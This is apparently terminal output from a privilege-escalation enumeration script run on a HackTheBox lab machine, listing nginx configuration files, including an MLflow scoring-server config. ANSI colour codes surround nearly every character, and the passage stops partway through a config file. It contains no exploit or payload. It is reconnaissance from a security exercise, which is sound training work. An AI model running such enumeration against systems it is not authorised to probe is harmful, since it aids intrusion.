[1;31m[0mw[1;31m[0mo[1;31m[0mr[1;31m[0mk[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mp[1;31m[0mr[1;31m[0mo[1;31m[0mc[1;31m[0me[1;31m[0ms[1;31m[0ms[1;31m[0me[1;31m[0ms[1;31m[0m [1;31m[0ma[1;31m[0mu[1;31m[0mt[1;31m[0mo[1;31m[0m;[1;31m[0m
[1;31m[0mp[1;31m[0mi[1;31m[0md[1;31m[0m [1;31m[0m/[1;31m[0mr[1;31m[0mu[1;31m[0mn[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m.[1;31m[0mp[1;31m[0mi[1;31m[0md[1;31m[0m;[1;31m[0m
[1;31m[0mi[1;31m[0mn[1;31m[0mc[1;31m[0ml[1;31m[0mu[1;31m[0md[1;31m[0me[1;31m[0m [1;31m[0m/[1;31m[0me[1;31m[0mt[1;31m[0mc[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m-[1;31m[0me[1;31m[0mn[1;31m[0ma[1;31m[0mb[1;31m[0ml[1;31m[0me[1;31m[0md[1;31m[0m/[1;31m[0m*[1;31m[0m.[1;31m[0mc[1;31m[0mo[1;31m[0mn[1;31m[0mf[1;31m[0m;[1;31m[0m
[1;31m[0me[1;31m[0mv[1;31m[0me[1;31m[0mn[1;31m[0mt[1;31m[0ms[1;31m[0m [1;31m[0m{[1;31m[0m
[1;31m[0m	[1;31m[0mw[1;31m[0mo[1;31m[0mr[1;31m[0mk[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mc[1;31m[0mo[1;31m[0mn[1;31m[0mn[1;31m[0me[1;31m[0mc[1;31m[0mt[1;31m[0mi[1;31m[0mo[1;31m[0mn[1;31m[0ms[1;31m[0m [1;31m[0m7[1;31m[0m6[1;31m[0m8[1;31m[0m;[1;31m[0m
[1;31m[0m}[1;31m[0m
[1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0m [1;31m[0m{[1;31m[0m
[1;31m[0m	[1;31m[0ms[1;31m[0me[1;31m[0mn[1;31m[0md[1;31m[0mf[1;31m[0mi[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mo[1;31m[0mn[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mt[1;31m[0mc[1;31m[0mp[1;31m[0m_[1;31m[0mn[1;31m[0mo[1;31m[0mp[1;31m[0mu[1;31m[0ms[1;31m[0mh[1;31m[0m [1;31m[0mo[1;31m[0mn[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mt[1;31m[0my[1;31m[0mp[1;31m[0me[1;31m[0ms[1;31m[0m_[1;31m[0mh[1;31m[0ma[1;31m[0ms[1;31m[0mh[1;31m[0m_[1;31m[0mm[1;31m[0ma[1;31m[0mx[1;31m[0m_[1;31m[0ms[1;31m[0mi[1;31m[0mz[1;31m[0me[1;31m[0m [1;31m[0m2[1;31m[0m0[1;31m[0m4[1;31m[0m8[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mi[1;31m[0mn[1;31m[0mc[1;31m[0ml[1;31m[0mu[1;31m[0md[1;31m[0me[1;31m[0m [1;31m[0m/[1;31m[0me[1;31m[0mt[1;31m[0mc[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0mm[1;31m[0mi[1;31m[0mm[1;31m[0me[1;31m[0m.[1;31m[0mt[1;31m[0my[1;31m[0mp[1;31m[0me[1;31m[0ms[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0md[1;31m[0me[1;31m[0mf[1;31m[0ma[1;31m[0mu[1;31m[0ml[1;31m[0mt[1;31m[0m_[1;31m[0mt[1;31m[0my[1;31m[0mp[1;31m[0me[1;31m[0m [1;31m[0ma[1;31m[0mp[1;31m[0mp[1;31m[0ml[1;31m[0mi[1;31m[0mc[1;31m[0ma[1;31m[0mt[1;31m[0mi[1;31m[0mo[1;31m[0mn[1;31m[0m/[1;31m[0mo[1;31m[0mc[1;31m[0mt[1;31m[0me[1;31m[0mt[1;31m[0m-[1;31m[0ms[1;31m[0mt[1;31m[0mr[1;31m[0me[1;31m[0ma[1;31m[0mm[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0ms[1;31m[0ms[1;31m[0ml[1;31m[0m_[1;31m[0mp[1;31m[0mr[1;31m[0me[1;31m[0mf[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0ms[1;31m[0me[1;31m[0mr[1;31m[0mv[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mc[1;31m[0mi[1;31m[0mp[1;31m[0mh[1;31m[0me[1;31m[0mr[1;31m[0ms[1;31m[0m [1;31m[0mo[1;31m[0mn[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0ma[1;31m[0mc[1;31m[0mc[1;31m[0me[1;31m[0ms[1;31m[0ms[1;31m[0m_[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m [1;31m[0m/[1;31m[0mv[1;31m[0ma[1;31m[0mr[1;31m[0m/[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0ma[1;31m[0mc[1;31m[0mc[1;31m[0me[1;31m[0ms[1;31m[0ms[1;31m[0m.[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0me[1;31m[0mr[1;31m[0mr[1;31m[0mo[1;31m[0mr[1;31m[0m_[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m [1;31m[0m/[1;31m[0mv[1;31m[0ma[1;31m[0mr[1;31m[0m/[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0me[1;31m[0mr[1;31m[0mr[1;31m[0mo[1;31m[0mr[1;31m[0m.[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mg[1;31m[0mz[1;31m[0mi[1;31m[0mp[1;31m[0m [1;31m[0mo[1;31m[0mn[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mi[1;31m[0mn[1;31m[0mc[1;31m[0ml[1;31m[0mu[1;31m[0md[1;31m[0me[1;31m[0m [1;31m[0m/[1;31m[0me[1;31m[0mt[1;31m[0mc[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0mc[1;31m[0mo[1;31m[0mn[1;31m[0mf[1;31m[0m.[1;31m[0md[1;31m[0m/[1;31m[0m*[1;31m[0m.[1;31m[0mc[1;31m[0mo[1;31m[0mn[1;31m[0mf[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mi[1;31m[0mn[1;31m[0mc[1;31m[0ml[1;31m[0mu[1;31m[0md[1;31m[0me[1;31m[0m [1;31m[0m/[1;31m[0me[1;31m[0mt[1;31m[0mc[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0ms[1;31m[0mi[1;31m[0mt[1;31m[0me[1;31m[0ms[1;31m[0m-[1;31m[0me[1;31m[0mn[1;31m[0ma[1;31m[0mb[1;31m[0ml[1;31m[0me[1;31m[0md[1;31m[0m/[1;31m[0m*[1;31m[0m;[1;31m[0m
[1;31m[0m}[1;31m[0m
-rw-r--r-- 1 svcweb svcweb 712 Sep 16  2025 /var/www/smarthire.htb/.venv/lib/python3.10/site-packages/mlflow/models/container/scoring_server/[1;31mnginx.conf[0m
[1;31m[0mw[1;31m[0mo[1;31m[0mr[1;31m[0mk[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mp[1;31m[0mr[1;31m[0mo[1;31m[0mc[1;31m[0me[1;31m[0ms[1;31m[0ms[1;31m[0me[1;31m[0ms[1;31m[0m [1;31m[0m1[1;31m[0m;[1;31m[0m
[1;31m[0mp[1;31m[0mi[1;31m[0md[1;31m[0m [1;31m[0m/[1;31m[0mt[1;31m[0mm[1;31m[0mp[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m.[1;31m[0mp[1;31m[0mi[1;31m[0md[1;31m[0m;[1;31m[0m
[1;31m[0me[1;31m[0mr[1;31m[0mr[1;31m[0mo[1;31m[0mr[1;31m[0m_[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m [1;31m[0m/[1;31m[0mv[1;31m[0ma[1;31m[0mr[1;31m[0m/[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0me[1;31m[0mr[1;31m[0mr[1;31m[0mo[1;31m[0mr[1;31m[0m.[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m;[1;31m[0m
[1;31m[0me[1;31m[0mv[1;31m[0me[1;31m[0mn[1;31m[0mt[1;31m[0ms[1;31m[0m [1;31m[0m{[1;31m[0m
[1;31m[0m}[1;31m[0m
[1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0m [1;31m[0m{[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0mi[1;31m[0mn[1;31m[0mc[1;31m[0ml[1;31m[0mu[1;31m[0md[1;31m[0me[1;31m[0m [1;31m[0m/[1;31m[0me[1;31m[0mt[1;31m[0mc[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0mm[1;31m[0mi[1;31m[0mm[1;31m[0me[1;31m[0m.[1;31m[0mt[1;31m[0my[1;31m[0mp[1;31m[0me[1;31m[0ms[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0md[1;31m[0me[1;31m[0mf[1;31m[0ma[1;31m[0mu[1;31m[0ml[1;31m[0mt[1;31m[0m_[1;31m[0mt[1;31m[0my[1;31m[0mp[1;31m[0me[1;31m[0m [1;31m[0ma[1;31m[0mp[1;31m[0mp[1;31m[0ml[1;31m[0mi[1;31m[0mc[1;31m[0ma[1;31m[0mt[1;31m[0mi[1;31m[0mo[1;31m[0mn[1;31m[0m/[1;31m[0mo[1;31m[0mc[1;31m[0mt[1;31m[0me[1;31m[0mt[1;31m[0m-[1;31m[0ms[1;31m[0mt[1;31m[0mr[1;31m[0me[1;31m[0ma[1;31m[0mm[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0ma[1;31m[0mc[1;31m[0mc[1;31m[0me[1;31m[0ms[1;31m[0ms[1;31m[0m_[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m [1;31m[0m/[1;31m[0mv[1;31m[0ma[1;31m[0mr[1;31m[0m/[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0ma[1;31m[0mc[1;31m[0mc[1;31m[0me[1;31m[0ms[1;31m[0ms[1;31m[0m.[1;31m[0ml[1;31m[0mo[1;31m[0mg[1;31m[0m [1;31m[0mc[1;31m[0mo[1;31m[0mm[1;31m[0mb[1;31m[0mi[1;31m[0mn[1;31m[0me[1;31m[0md[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0mu[1;31m[0mp[1;31m[0ms[1;31m[0mt[1;31m[0mr[1;31m[0me[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0mg[1;31m[0mu[1;31m[0mn[1;31m[0mi[1;31m[0mc[1;31m[0mo[1;31m[0mr[1;31m[0mn[1;31m[0m [1;31m[0m{[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0ms[1;31m[0me[1;31m[0mr[1;31m[0mv[1;31m[0me[1;31m[0mr[1;31m[0m [1;31m[0m1[1;31m[0m2[1;31m[0m7[1;31m[0m.[1;31m[0m0[1;31m[0m.[1;31m[0m0[1;31m[0m.[1;31m[0m1[1;31m[0m:[1;31m[0m8[1;31m[0m0[1;31m[0m0[1;31m[0m0[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m}[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0ms[1;31m[0me[1;31m[0mr[1;31m[0mv[1;31m[0me[1;31m[0mr[1;31m[0m [1;31m[0m{[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0ml[1;31m[0mi[1;31m[0ms[1;31m[0mt[1;31m[0me[1;31m[0mn[1;31m[0m [1;31m[0m8[1;31m[0m0[1;31m[0m8[1;31m[0m0[1;31m[0m [1;31m[0md[1;31m[0me[1;31m[0mf[1;31m[0me[1;31m[0mr[1;31m[0mr[1;31m[0me[1;31m[0md[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0mc[1;31m[0ml[1;31m[0mi[1;31m[0me[1;31m[0mn[1;31m[0mt[1;31m[0m_[1;31m[0mm[1;31m[0ma[1;31m[0mx[1;31m[0m_[1;31m[0mb[1;31m[0mo[1;31m[0md[1;31m[0my[1;31m[0m_[1;31m[0ms[1;31m[0mi[1;31m[0mz[1;31m[0me[1;31m[0m [1;31m[0m5[1;31m[0mm[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0mk[1;31m[0me[1;31m[0me[1;31m[0mp[1;31m[0ma[1;31m[0ml[1;31m[0mi[1;31m[0mv[1;31m[0me[1;31m[0m_[1;31m[0mt[1;31m[0mi[1;31m[0mm[1;31m[0me[1;31m[0mo[1;31m[0mu[1;31m[0mt[1;31m[0m [1;31m[0m7[1;31m[0m5[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31mlocation ~ ^/(ping|invocations) {[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0mp[1;31m[0mr[1;31m[0mo[1;31m[0mx[1;31m[0my[1;31m[0m_[1;31m[0ms[1;31m[0me[1;31m[0mt[1;31m[0m_[1;31m[0mh[1;31m[0me[1;31m[0ma[1;31m[0md[1;31m[0me[1;31m[0mr[1;31m[0m [1;31m[0mX[1;31m[0m-[1;31m[0mF[1;31m[0mo[1;31m[0mr[1;31m[0mw[1;31m[0ma[1;31m[0mr[1;31m[0md[1;31m[0me[1;31m[0md[1;31m[0m-[1;31m[0mF[1;31m[0mo[1;31m[0mr[1;31m[0m [1;31m[0m$[1;31m[0mp[1;31m[0mr[1;31m[0mo[1;31m[0mx[1;31m[0my[1;31m[0m_[1;31m[0ma[1;31m[0md[1;31m[0md[1;31m[0m_[1;31m[0mx[1;31m[0m_[1;31m[0mf[1;31m[0mo[1;31m[0mr[1;31m[0mw[1;31m[0ma[1;31m[0mr[1;31m[0md[1;31m[0me[1;31m[0md[1;31m[0m_[1;31m[0mf[1;31m[0mo[1;31m[0mr[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0mp[1;31m[0mr[1;31m[0mo[1;31m[0mx[1;31m[0my[1;31m[0m_[1;31m[0ms[1;31m[0me[1;31m[0mt[1;31m[0m_[1;31m[0mh[1;31m[0me[1;31m[0ma[1;31m[0md[1;31m[0me[1;31m[0mr[1;31m[0m [1;31m[0mH[1;31m[0mo[1;31m[0ms[1;31m[0mt[1;31m[0m [1;31m[0m$[1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0m_[1;31m[0mh[1;31m[0mo[1;31m[0ms[1;31m[0mt[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0mp[1;31m[0mr[1;31m[0mo[1;31m[0mx[1;31m[0my[1;31m[0m_[1;31m[0mr[1;31m[0me[1;31m[0md[1;31m[0mi[1;31m[0mr[1;31m[0me[1;31m[0mc[1;31m[0mt[1;31m[0m [1;31m[0mo[1;31m[0mf[1;31m[0mf[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31mproxy_pass[0m [1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0m:[1;31m[0m/[1;31m[0m/[1;31m[0mg[1;31m[0mu[1;31m[0mn[1;31m[0mi[1;31m[0mc[1;31m[0mo[1;31m[0mr[1;31m[0mn[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0mc[1;31m[0ml[1;31m[0mi[1;31m[0me[1;31m[0mn[1;31m[0mt[1;31m[0m_[1;31m[0mm[1;31m[0ma[1;31m[0mx[1;31m[0m_[1;31m[0mb[1;31m[0mo[1;31m[0md[1;31m[0my[1;31m[0m_[1;31m[0ms[1;31m[0mi[1;31m[0mz[1;31m[0me[1;31m[0m [1;31m[0m1[1;31m[0m0[1;31m[0m0[1;31m[0mm[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m}[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0ml[1;31m[0mo[1;31m[0mc[1;31m[0ma[1;31m[0mt[1;31m[0mi[1;31m[0mo[1;31m[0mn[1;31m[0m [1;31m[0m/[1;31m[0m [1;31m[0m{[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0mr[1;31m[0me[1;31m[0mt[1;31m[0mu[1;31m[0mr[1;31m[0mn[1;31m[0m [1;31m[0m4[1;31m[0m0[1;31m[0m4[1;31m[0m [1;31m[0m"[1;31m[0m{[1;31m[0m}[1;31m[0m"[1;31m[0m;[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m [1;31m[0m}[1;31m[0m
[1;31m[0m [1;31m[0m [1;31m[0m}[1;31m[0m
[1;31m[0m}[1;31m[0m

-rw-r--r-- 1 root root 389 May 30  2023 /etc/default/[1;31mnginx[0m

-rwxr-xr-x 1 root root 4579 May 30  2023 /etc/init.d/[1;31mnginx[0m

-rw-r--r-- 1 root root 329 May 30  2023 /etc/logrotate.d/[1;31mnginx[0m

drwxr-xr-x 8 root root 4096 May 13 12:40 /etc/[1;31mnginx[0m
-rw-r--r-- 1 root root 423 May 30  2023 /etc/nginx/snippets/fastcgi-php[1;31m.conf[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0ms[1;31m[0mp[1;31m[0ml[1;31m[0mi[1;31m[0mt[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mt[1;31m[0mh[1;31m[0m_[1;31m[0mi[1;31m[0mn[1;31m[0mf[1;31m[0mo[1;31m[0m [1;31m[0m^[1;31m[0m([1;31m[0m.[1;31m[0m+[1;31m[0m?[1;31m[0m\[1;31m[0m.[1;31m[0mp[1;31m[0mh[1;31m[0mp[1;31m[0m)[1;31m[0m([1;31m[0m/[1;31m[0m.[1;31m[0m*[1;31m[0m)[1;31m[0m$[1;31m[0m;[1;31m[0m
[1;31mtry_files[0m [1;31m[0m$[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0ms[1;31m[0mc[1;31m[0mr[1;31m[0mi[1;31m[0mp[1;31m[0mt[1;31m[0m_[1;31m[0mn[1;31m[0ma[1;31m[0mm[1;31m[0me[1;31m[0m [1;31m[0m=[1;31m[0m4[1;31m[0m0[1;31m[0m4[1;31m[0m;[1;31m[0m
[1;31m[0ms[1;31m[0me[1;31m[0mt[1;31m[0m [1;31m[0m$[1;31m[0mp[1;31m[0ma[1;31m[0mt[1;31m[0mh[1;31m[0m_[1;31m[0mi[1;31m[0mn[1;31m[0mf[1;31m[0mo[1;31m[0m [1;31m[0m$[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mt[1;31m[0mh[1;31m[0m_[1;31m[0mi[1;31m[0mn[1;31m[0mf[1;31m[0mo[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mp[1;31m[0ma[1;31m[0mr[1;31m[0ma[1;31m[0mm[1;31m[0m [1;31m[0mP[1;31m[0mA[1;31m[0mT[1;31m[0mH[1;31m[0m_[1;31m[0mI[1;31m[0mN[1;31m[0mF[1;31m[0mO[1;31m[0m [1;31m[0m$[1;31m[0mp[1;31m[0ma[1;31m[0mt[1;31m[0mh[1;31m[0m_[1;31m[0mi[1;31m[0mn[1;31m[0mf[1;31m[0mo[1;31m[0m;[1;31m[0m
[1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m_[1;31m[0mi[1;31m[0mn[1;31m[0md[1;31m[0me[1;31m[0mx[1;31m[0m [1;31m[0mi[1;31m[0mn[1;31m[0md[1;31m[0me[1;31m[0mx[1;31m[0m.[1;31m[0mp[1;31m[0mh[1;31m[0mp[1;31m[0m;[1;31m[0m
[1;31m[0mi[1;31m[0mn[1;31m[0mc[1;31m[0ml[1;31m[0mu[1;31m[0md[1;31m[0me[1;31m[0m [1;31m[0mf[1;31m[0ma[1;31m[0ms[1;31m[0mt[1;31m[0mc[1;31m[0mg[1;31m[0mi[1;31m[0m.[1;31m[0mc[1;31m[0mo[1;31m[0mn[1;31m[0mf[1;31m[0m;[1;31m[0m
-rw-r--r-- 1 root root 217 May 30  2023 /etc/nginx/snippets/snakeoil[1;31m.conf[0m
[1;31m[0ms[1;31m[0ms[1;31m[0ml[1;31m[0m_[1;31m[0mc[1;31m[0me[1;31m[0mr[1;31m[0mt[1;31m[0mi[1;31m[0mf[1;31m[0mi[1;31m[0mc[1;31m[0ma[1;31m[0mt[1;31m[0me[1;31m[0m [1;31m[0m/[1;31m[0me[1;31m[0mt[1;31m[0mc[1;31m[0m/[1;31m[0ms[1;31m[0ms[1;31m[0ml[1;31m[0m/[1;31m[0mc[1;31m[0me[1;31m[0mr[1;31m[0mt[1;31m[0ms[1;31m[0m/[1;31m[0ms[1;31m[0ms[1;31m[0ml[1;31m[0m-[1;31m[0mc[1;31m[0me[1;31m[0mr[1;31m[0mt[1;31m[0m-[1;31m[0ms[1;31m[0mn[1;31m[0ma[1;31m[0mk[1;31m[0me[1;31m[0mo[1;31m[0mi[1;31m[0ml[1;31m[0m.[1;31m[0mp[1;31m[0me[1;31m[0mm[1;31m[0m;[1;31m[0m
[1;31m[0ms[1;31m[0ms[1;31m[0ml[1;31m[0m_[1;31m[0mc[1;31m[0me[1;31m[0mr[1;31m[0mt[1;31m[0mi[1;31m[0mf[1;31m[0mi[1;31m[0mc[1;31m[0ma[1;31m[0mt[1;31m[0me[1;31m[0m_[1;31m[0mk[1;31m[0me[1;31m[0my[1;31m[0m [1;31m[0m/[1;31m[0me[1;31m[0mt[1;31m[0mc[1;31m[0m/[1;31m[0ms[1;31m[0ms[1;31m[0ml[1;31m[0m/[1;31m[0mp[1;31m[0mr[1;31m[0mi[1;31m[0mv[1;31m[0ma[1;31m[0mt[1;31m[0me[1;31m[0m/[1;31m[0ms[1;31m[0ms[1;31m[0ml[1;31m[0m-[1;31m[0mc[1;31m[0me[1;31m[0mr[1;31m[0mt[1;31m[0m-[1;31m[0ms[1;31m[0mn[1;31m[0ma[1;31m[0mk[1;31m[0me[1;31m[0mo[1;31m[0mi[1;31m[0ml[1;31m[0m.[1;31m[0mk[1;31m[0me[1;31m[0my[1;31m[0m;[1;31m[0m
-rw-r--r-- 1 root root 1447 May 30  2023 /etc/nginx/nginx[1;31m.conf[0m
[1;31m[0mu[1;31m[0ms[1;31m[0me[1;31m[0mr[1;31m[0m [1;31m[0mw[1;31m[0mw[1;31m[0mw[1;31m[0m-[1;31m[0md[1;31m[0ma[1;31m[0mt[1;31m[0ma[1;31m[0m;[1;31m[0m
[1;31m[0mw[1;31m[0mo[1;31m[0mr[1;31m[0mk[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mp[1;31m[0mr[1;31m[0mo[1;31m[0mc[1;31m[0me[1;31m[0ms[1;31m[0ms[1;31m[0me[1;31m[0ms[1;31m[0m [1;31m[0ma[1;31m[0mu[1;31m[0mt[1;31m[0mo[1;31m[0m;[1;31m[0m
[1;31m[0mp[1;31m[0mi[1;31m[0md[1;31m[0m [1;31m[0m/[1;31m[0mr[1;31m[0mu[1;31m[0mn[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m.[1;31m[0mp[1;31m[0mi[1;31m[0md[1;31m[0m;[1;31m[0m
[1;31m[0mi[1;31m[0mn[1;31m[0mc[1;31m[0ml[1;31m[0mu[1;31m[0md[1;31m[0me[1;31m[0m [1;31m[0m/[1;31m[0me[1;31m[0mt[1;31m[0mc[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0mm[1;31m[0mo[1;31m[0md[1;31m[0mu[1;31m[0ml[1;31m[0me[1;31m[0ms[1;31m[0m-[1;31m[0me[1;31m[0mn[1;31m[0ma[1;31m[0mb[1;31m[0ml[1;31m[0me[1;31m[0md[1;31m[0m/[1;31m[0m*[1;31m[0m.[1;31m[0mc[1;31m[0mo[1;31m[0mn[1;31m[0mf[1;31m[0m;[1;31m[0m
[1;31m[0me[1;31m[0mv[1;31m[0me[1;31m[0mn[1;31m[0mt[1;31m[0ms[1;31m[0m [1;31m[0m{[1;31m[0m
[1;31m[0m	[1;31m[0mw[1;31m[0mo[1;31m[0mr[1;31m[0mk[1;31m[0me[1;31m[0mr[1;31m[0m_[1;31m[0mc[1;31m[0mo[1;31m[0mn[1;31m[0mn[1;31m[0me[1;31m[0mc[1;31m[0mt[1;31m[0mi[1;31m[0mo[1;31m[0mn[1;31m[0ms[1;31m[0m [1;31m[0m7[1;31m[0m6[1;31m[0m8[1;31m[0m;[1;31m[0m
[1;31m[0m}[1;31m[0m
[1;31m[0mh[1;31m[0mt[1;31m[0mt[1;31m[0mp[1;31m[0m [1;31m[0m{[1;31m[0m
[1;31m[0m	[1;31m[0ms[1;31m[0me[1;31m[0mn[1;31m[0md[1;31m[0mf[1;31m[0mi[1;31m[0ml[1;31m[0me[1;31m[0m [1;31m[0mo[1;31m[0mn[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mt[1;31m[0mc[1;31m[0mp[1;31m[0m_[1;31m[0mn[1;31m[0mo[1;31m[0mp[1;31m[0mu[1;31m[0ms[1;31m[0mh[1;31m[0m [1;31m[0mo[1;31m[0mn[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mt[1;31m[0my[1;31m[0mp[1;31m[0me[1;31m[0ms[1;31m[0m_[1;31m[0mh[1;31m[0ma[1;31m[0ms[1;31m[0mh[1;31m[0m_[1;31m[0mm[1;31m[0ma[1;31m[0mx[1;31m[0m_[1;31m[0ms[1;31m[0mi[1;31m[0mz[1;31m[0me[1;31m[0m [1;31m[0m2[1;31m[0m0[1;31m[0m4[1;31m[0m8[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0mi[1;31m[0mn[1;31m[0mc[1;31m[0ml[1;31m[0mu[1;31m[0md[1;31m[0me[1;31m[0m [1;31m[0m/[1;31m[0me[1;31m[0mt[1;31m[0mc[1;31m[0m/[1;31m[0mn[1;31m[0mg[1;31m[0mi[1;31m[0mn[1;31m[0mx[1;31m[0m/[1;31m[0mm[1;31m[0mi[1;31m[0mm[1;31m[0me[1;31m[0m.[1;31m[0mt[1;31m[0my[1;31m[0mp[1;31m[0me[1;31m[0ms[1;31m[0m;[1;31m[0m
[1;31m[0m	[1;31m[0md[1;31m[0me[1;31m[0mf[1;31m[0ma[1;31m[0mu[1;31m[0ml[1;31m[0mt[1;31m[0m_[1;31m[0mt[1;31m[0my[1;31m[0mp[1;31m[0me[1;31m[0m [1;31m[0ma[1;31m[0mp[1;31m[0mp[1;31m[0ml[1;31m[0mi[1;31m[0mc[1;31m[0ma[1;31m[0mt[1;31m[0mi[1;31m[0mo[1;31m[0mn[1;31m[0m/[1;31m[0mo[1;31m[0mc[1;31m[0mt[1;31m[0me[1;31m[0mt[1;31m[0m-[1;31m[0ms[1;31m[0mt[1;31m[0mr[1;31m[0me[1;31m[0ma[1;31m[0mm[1;31m[0m;[1;31m[0m
